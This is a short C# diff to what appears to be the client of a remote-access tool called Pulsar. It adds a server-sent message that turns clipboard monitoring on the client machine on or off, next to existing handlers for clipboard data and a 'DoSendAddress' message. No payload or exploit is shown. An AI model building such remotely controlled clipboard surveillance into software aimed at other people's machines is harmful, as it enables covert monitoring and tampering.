@@ -19,7 +19,7 @@ namespace Pulsar.Client.Messages
         public static string _lastReceivedClipboardText = string.Empty;
         public static DateTime _lastReceivedTime = DateTime.MinValue;
 
-        public bool CanExecute(IMessage message) => message is DoSendAddress || message is SendClipboardData;
+        public bool CanExecute(IMessage message) => message is DoSendAddress || message is SendClipboardData || message is SetClipboardMonitoringEnabled;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -31,6 +31,9 @@ namespace Pulsar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case SendClipboardData msg:
+                    Execute(sender, msg);
+                    break;
+                case SetClipboardMonitoringEnabled msg:
                     Execute(sender, msg);
                     break;
             }
@@ -97,6 +100,16 @@ namespace Pulsar.Client.Messages
             clipboardThread.SetApartmentState(ApartmentState.STA);
             clipboardThread.Start();
             clipboardThread.Join(1000);
+        }
+        
+        private void Execute(ISender client, SetClipboardMonitoringEnabled message)
+        {
+            var application = PulsarApplication.Instance;
+            if (application?.ClipboardChecker != null)
+            {
+                application.ClipboardChecker.IsEnabled = message.Enabled;
+                Debug.WriteLine($"ClipboardHandler: Clipboard monitoring {(message.Enabled ? "enabled" : "disabled")} by server");
+            }
         }
     }
 }
